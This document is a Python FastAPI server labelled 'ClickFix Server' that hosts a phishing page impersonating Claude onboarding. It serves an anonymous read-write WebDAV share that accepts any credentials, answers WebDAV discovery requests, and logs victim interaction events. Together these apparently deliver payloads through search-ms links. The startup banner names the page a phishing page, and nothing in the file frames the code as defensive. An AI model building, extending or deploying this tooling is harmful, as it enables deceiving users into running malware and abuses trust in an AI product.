"""
ClickFix Server v2.1 - Clean Version
Claude + search-ms WebDAV
"""

from pathlib import Path
from datetime import datetime
import yaml

from fastapi import FastAPI, Request, HTTPException,Response
from fastapi.responses import HTMLResponse, JSONResponse, RedirectResponse
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates

from wsgidav.wsgidav_app import WsgiDAVApp
from a2wsgi import WSGIMiddleware
import uvicorn


# ====================== CONFIG ======================
BASE_DIR = Path(__file__).parent
CONFIG_FILE = BASE_DIR / "config" / "config.yaml"

def load_config():
    if CONFIG_FILE.exists():
        with open(CONFIG_FILE, "r", encoding="utf-8") as f:
            return yaml.safe_load(f) or {}
    return {
        "server": {"host": "0.0.0.0", "port": 8080},
        "webdav": {"enabled": True, "mount_path": "/dav", "root_folder": "dav", "anonymous": True},
        "template": "chatbot_onboarding.html",
        "debug": False
    }

config = load_config()

# ====================== WEBDAV ======================
class AnonymousDomainController:
    """Custom domain controller that always allows anonymous access"""
    def __init__(self, *args, **kwargs):
        pass
    
    def get_domain_realm(self, path, environ):
        return None
    
    def get_user(self, realm, username):
        return None
    
    def get_realm(self, realm):
        return None
    
    def require_authentication(self, realm, environ):
        return False  # Never require auth
    
    def get_user_realm(self, username):
        return None
    
    def isRealmUser(self, realm, username):
        return True
    
    def authTransFunc(self, username, password, environ):
        return username  # Accept any username/password
    
    def supports_http_digest_auth(self):
        return False
    
    def is_share_anonymous(self, path_info):
        return True
    
    def known_roles(self, path_info):
        return []
    
    def known_permissions(self, path_info, username):
        return ["r", "w"]
    
    def basic_auth_user(self, realm, user, password):
        return True
    
    def digest_auth_user(self, realm, user, hash):
        return True

def create_webdav_app():
    if not config["webdav"].get("enabled"):
        return None
    
    dav_root = BASE_DIR / config["webdav"].get("root_folder", "dav")
    dav_root.mkdir(exist_ok=True)
    
    # Create WebDAV app with anonymous access
    try:
        dav_config = {
            "provider_mapping": {
                "/": str(dav_root)
            },
            "http_authenticator": {
                "domain_controller": AnonymousDomainController,
                "accept_basic": True,
                "accept_digest": False,
                "default_to_digest": False,
            },
            "verbose": 1,
            "dir_browser": {"enable": True},
        }
        return WsgiDAVApp(dav_config)
    except Exception as e:
        print(f"[!] WebDAV init failed: {e}")
        return None

# ====================== APP ======================
app = FastAPI(title="Claude ClickFix", docs_url=None, redoc_url=None)

app.mount("/static", StaticFiles(directory=str(BASE_DIR / "static")), name="static")
templates = Jinja2Templates(directory=str(BASE_DIR / "templates"))

webdav_app = create_webdav_app()
if webdav_app:
    app.mount(config["webdav"]["mount_path"], WSGIMiddleware(webdav_app))
    print(f"[+] WebDAV mounted at {config['webdav']['mount_path']}")

# ====================== ROUTES ======================
@app.get("/", response_class=HTMLResponse)
async def root():
    return RedirectResponse(url="/claude")

@app.get("/claude", response_class=HTMLResponse)
async def claude_page(request: Request):
    modal_template = config.get("modal_template", "onboarding_template.html")
    return templates.TemplateResponse(
        request, 
        config.get("template"), 
        {"request": request, "domain": request.url.hostname, "modal_template": modal_template}
    )

@app.post("/api/track")
async def track_event(request: Request):
    try:
        data = await request.json()
        print(f"[TRACK] {data}")
        return JSONResponse({"status": "ok"})
    except:
        return JSONResponse({"status": "error"}, status_code=400)
@app.options("/")
async def options_root():
    headers = {
        "DAV": "1, 2",
        "MS-Author-Via": "DAV",
        "Allow": "OPTIONS, GET, HEAD, POST, PROPFIND, PROPPATCH",
    }
    return Response(status_code=200, headers=headers)
# ====================== START ======================
if __name__ == "__main__":
    server_cfg = config.get("server", {})
    host = server_cfg.get("host", "0.0.0.0")
    port = server_cfg.get("port", 8080)
    
    print("="*70)
    print("ClickFix Server Started!")
    print(f"-> Phishing Page : http://{host}:{port}/claude")
    print(f"-> WebDAV        : http://{host}:{port}/dav")
    print("="*70)
    
    uvicorn.run(app, host=host, port=port)